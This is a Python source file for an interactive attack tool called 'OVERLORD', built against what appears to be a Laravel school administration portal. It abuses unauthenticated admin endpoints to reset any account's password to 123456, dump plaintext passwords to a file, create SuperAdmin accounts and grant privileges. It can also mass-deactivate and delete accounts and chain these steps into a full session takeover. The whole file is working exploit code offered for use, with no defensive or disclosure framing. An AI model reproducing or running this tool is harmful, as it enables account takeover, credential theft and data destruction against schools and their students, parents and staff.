import sys
import json
import re
import asyncio
import aiohttp
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

BANNER = rf"""
{RED}   ╔═══════════════════════════════════════════════╗
   ║  {BOLD}OVERLORD{RESET}{RED}  — Admin Portal Takeover Suite     ║
   ║  A-01 → A-08 | R-01 | Unauth Full Control   ║
   ╚═══════════════════════════════════════════════╝{RESET}
"""

def menu():
    return f"""
  {CYAN}[1]{RESET} Reset any account password to 123456     {DIM}(A-01){RESET}
  {CYAN}[2]{RESET} Dump all plaintext passwords              {DIM}(A-02){RESET}
  {CYAN}[3]{RESET} Create account with arbitrary role        {DIM}(A-03){RESET}
  {CYAN}[4]{RESET} Grant/revoke portal privilege             {DIM}(A-04){RESET}
  {CYAN}[5]{RESET} Mass account deactivation                 {DIM}(A-05){RESET}
  {CYAN}[6]{RESET} Mass account creation (fixAccountConflict){DIM}(R-01){RESET}
  {CYAN}[7]{RESET} Sync DB delete                            {DIM}(A-07){RESET}
  {CYAN}[8]{RESET} Full auto-takeover chain                  {DIM}(A-08){RESET}
  {DIM}[0]{RESET} Exit
"""

# ── MODE 1: Reset password ─────────────────────────────────────────────────────
def mode_reset_password(base_url):
    target = input(f"  {CYAN}[?]{RESET} Target email/TID (or comma-list): ").strip()
    targets = [t.strip() for t in target.split(",") if t.strip()]
    
    import requests
    for tid in targets:
        r = requests.get(f"{base_url}/administrator/setup/accounts/updatepass",
                         params={"tid": tid}, timeout=10)
        try:
            data = r.json()
            if data[0].get("status") == 1:
                print(f"  {GREEN}[+]{RESET} Reset: {BOLD}{tid}{RESET} → password is now {YELLOW}123456{RESET}")
            else:
                print(f"  {RED}[-]{RESET} Failed: {tid} — {data}")
        except:
            print(f"  {RED}[-]{RESET} Error: {tid} — HTTP {r.status_code}")

# ── MODE 2: Dump plaintext passwords ──────────────────────────────────────────
def mode_dump_passwords(base_url):
    import requests
    print(f"  {DIM}[*] Fetching account list...{RESET}")
    r = requests.get(f"{base_url}/administrator/setup/accounts/list",
                     params={"status": "1", "length": "9999", "start": "0"}, timeout=30)
    try:
        data = r.json()
    except:
        print(f"  {RED}[-]{RESET} Failed to parse response (HTTP {r.status_code})")
        return

    rows = data.get("data", [])
    found = 0
    results = []
    for row in rows:
        users = row.get("user", [])
        if isinstance(users, dict):
            users = [users]
        for u in users:
            email = u.get("email", "")
            pw = u.get("passwordstr", "")
            utype = u.get("type", "?")
            if pw:
                found += 1
                results.append(f"{email}:{pw} (type={utype})")
                print(f"  {GREEN}[+]{RESET} {BOLD}{email}{RESET}:{YELLOW}{pw}{RESET} {DIM}type={utype}{RESET}")

    if not found:
        # Try alternate structure
        for row in rows:
            email = row.get("email", row.get("tid", ""))
            pw = row.get("passwordstr", "")
            if pw:
                found += 1
                print(f"  {GREEN}[+]{RESET} {BOLD}{email}{RESET}:{YELLOW}{pw}{RESET}")

    print(f"\n  {CYAN}[i]{RESET} Total with plaintext: {BOLD}{found}{RESET} / {len(rows)} accounts")
    
    save = input(f"  {CYAN}[?]{RESET} Save to file? (filename or N): ").strip()
    if save and save.lower() != "n":
        with open(save, "w", encoding="utf-8") as f:
            f.write("\n".join(results))
        print(f"  {GREEN}[+]{RESET} Saved to {save}")

# ── MODE 3: Create account ────────────────────────────────────────────────────
def mode_create_account(base_url):
    import requests
    print(f"  {DIM}Roles: 1=Student 2=Parent 3=Teacher 6=Admin 7=Student 8=Finance 9=Cashier 17=SuperAdmin{RESET}")
    lname   = input(f"  {CYAN}[?]{RESET} Last name: ").strip() or "Test"
    fname   = input(f"  {CYAN}[?]{RESET} First name: ").strip() or "Account"
    utype   = input(f"  {CYAN}[?]{RESET} Role/type number: ").strip() or "17"
    email   = input(f"  {CYAN}[?]{RESET} Email (optional): ").strip()

    params = {
        "lname": lname, "fname": fname, "mname": "", "title": "", "acadtitle": "",
        "suffix": "", "lcn": "", "utype": utype, "userid": "1",
        "bdate": "1990-01-01", "gender": "M", "national": "1",
        "marital": "1", "mobile": "09000000000",
        "email": email or f"{fname.lower()}.{lname.lower()}@test.com",
        "address": "Test Address"
    }
    r = requests.get(f"{base_url}/administrator/setup/accounts/create/account",
                     params=params, timeout=10)
    try:
        data = r.json()
        if data[0].get("status") == 1:
            print(f"  {GREEN}[+]{RESET} Account created! Login: TID / {YELLOW}123456{RESET}")
            print(f"  {DIM}[*] Check /administrator/setup/accounts/list for the generated TID{RESET}")
        else:
            print(f"  {RED}[-]{RESET} Response: {data}")
    except:
        print(f"  {RED}[-]{RESET} HTTP {r.status_code}: {r.text[:200]}")

# ── MODE 4: Grant/revoke privilege ────────────────────────────────────────────
def mode_privilege(base_url):
    import requests
    userid  = input(f"  {CYAN}[?]{RESET} User ID: ").strip()
    utype   = input(f"  {CYAN}[?]{RESET} User type to set (17=SuperAdmin): ").strip() or "17"
    status  = input(f"  {CYAN}[?]{RESET} Status (1=grant, 0=revoke): ").strip() or "1"

    r = requests.get(f"{base_url}/administrator/setup/accounts/update/privilege",
                     params={"userid": userid, "usertype": utype, "status": status, "updateuserid": "1"},
                     timeout=10)
    try:
        print(f"  {GREEN}[+]{RESET} Privilege updated: user {userid} → type={utype} status={status}")
    except:
        print(f"  {RED}[-]{RESET} HTTP {r.status_code}")

# ── MODE 5: Mass deactivation ─────────────────────────────────────────────────
def mode_deactivate(base_url):
    import requests
    id_range = input(f"  {CYAN}[?]{RESET} Teacher ID range (e.g. 1-500): ").strip() or "1-100"
    start, end = map(int, id_range.split("-"))
    
    count = 0
    for tid in tqdm(range(start, end + 1), desc="Deactivating", ncols=80):
        r = requests.get(f"{base_url}/administrator/setup/accounts/update/active",
                         params={"teacher": tid, "status": "0"}, timeout=5)
        if r.status_code == 200:
            count += 1
    print(f"  {GREEN}[+]{RESET} Deactivated {count} accounts (IDs {start}–{end})")

# ── MODE 6: fixAccountConflict ────────────────────────────────────────────────
def mode_fix_accounts(base_url):
    import requests
    print(f"  {YELLOW}[!]{RESET} This creates accounts (pw=123456) for ALL students/parents without one")
    confirm = input(f"  {CYAN}[?]{RESET} Proceed? (y/N): ").strip().lower()
    if confirm != "y":
        return
    r = requests.get(f"{base_url}/fixAccountConflict", timeout=30)
    print(f"  {GREEN}[+]{RESET} fixAccountConflict triggered — HTTP {r.status_code}")
    print(f"  {DIM}[*] All students/parents now have login with password=123456{RESET}")

# ── MODE 7: Sync DB delete ────────────────────────────────────────────────────
def mode_sync_delete(base_url):
    import requests
    id_range = input(f"  {CYAN}[?]{RESET} Teacher IDs to sync-delete (e.g. 1-10): ").strip() or "1-5"
    start, end = map(int, id_range.split("-"))
    for tid in range(start, end + 1):
        r = requests.get(f"{base_url}/administrator/setup/accounts/syncdelete",
                         params={"teacher": tid}, timeout=5)
        print(f"  {GREEN}[+]{RESET} Sync deleted teacher ID {tid} — HTTP {r.status_code}")

# ── MODE 8: Full auto-takeover ────────────────────────────────────────────────
def mode_auto_takeover(base_url):
    import requests
    print(f"  {YELLOW}[!]{RESET} Full auto-chain: reset admin → login → extract session")
    
    candidates = input(f"  {CYAN}[?]{RESET} Emails to try (comma-sep, or Enter for defaults): ").strip()
    if not candidates:
        candidates = "admin@school.edu,superadmin@school.edu,registrar@school.edu,admin,superadmin"
    
    targets = [t.strip() for t in candidates.split(",") if t.strip()]
    s = requests.Session()
    
    for email in targets:
        print(f"\n  {DIM}[*] Trying: {email}{RESET}")
        # Step 1: Reset
        r = requests.get(f"{base_url}/administrator/setup/accounts/updatepass",
                         params={"tid": email}, timeout=10)
        try:
            data = r.json()
            if data[0].get("status") != 1:
                print(f"  {RED}[-]{RESET} Not found: {email}")
                continue
        except:
            continue
        
        print(f"  {GREEN}[+]{RESET} Password reset: {email} → 123456")
        
        # Step 2: Get CSRF
        login_page = s.get(f"{base_url}/login", timeout=10)
        csrf_match = re.search(r'name="_token"\s*value="([^"]+)"', login_page.text)
        if not csrf_match:
            csrf_match = re.search(r'csrf-token"\s*content="([^"]+)"', login_page.text)
        csrf = csrf_match.group(1) if csrf_match else ""
        
        # Step 3: Login
        login_r = s.post(f"{base_url}/login", data={
            "_token": csrf, "email": email, "password": "123456"
        }, allow_redirects=True, timeout=10)
        
        if "dashboard" in login_r.url or "home" in login_r.url or login_r.status_code == 200:
            session_cookie = s.cookies.get("laravel_session", "")
            if session_cookie:
                print(f"  {GREEN}[+]{RESET} {BOLD}LOGIN SUCCESS{RESET} as {YELLOW}{email}{RESET}")
                print(f"  {GREEN}[+]{RESET} Session: {session_cookie[:60]}...")
                print(f"  {GREEN}[+]{RESET} Redirected to: {login_r.url}")
                return
        
        print(f"  {RED}[-]{RESET} Login failed for {email}")
        s = requests.Session()  # reset session
    
    print(f"\n  {RED}[-]{RESET} No successful login — try adding more email candidates")

# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(BANNER)
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
    
    while True:
        print(menu())
        choice = input(f"  {DIM}┌─[overlord]─[~]{RESET}\n  {DIM}└──╼ ${RESET} ").strip()
        
        if choice == "0":
            break
        elif choice == "1":
            mode_reset_password(BASE_URL)
        elif choice == "2":
            mode_dump_passwords(BASE_URL)
        elif choice == "3":
            mode_create_account(BASE_URL)
        elif choice == "4":
            mode_privilege(BASE_URL)
        elif choice == "5":
            mode_deactivate(BASE_URL)
        elif choice == "6":
            mode_fix_accounts(BASE_URL)
        elif choice == "7":
            mode_sync_delete(BASE_URL)
        elif choice == "8":
            mode_auto_takeover(BASE_URL)
        else:
            print(f"  {RED}[!]{RESET} Invalid choice")
    
    print(f"\n  {DIM}[*] OVERLORD session ended{RESET}\n")
